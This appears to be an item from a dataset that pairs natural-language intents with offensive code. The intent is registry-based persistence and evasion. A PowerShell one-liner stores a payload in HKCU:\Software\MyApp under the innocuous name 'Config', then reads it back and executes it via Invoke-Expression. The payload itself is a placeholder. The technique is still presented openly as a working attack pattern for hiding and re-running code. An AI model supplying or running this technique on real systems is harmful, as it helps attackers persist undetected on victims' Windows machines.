# Natural language intent:
# Registry Key Usage for Persistence, Uses the Windows Registry to store and later execute encoded payloads, aiding in persistence and evasion.

$path = 'HKCU:\Software\MyApp'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name 'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path -Name 'Config'; Invoke-Expression $regValue.Config
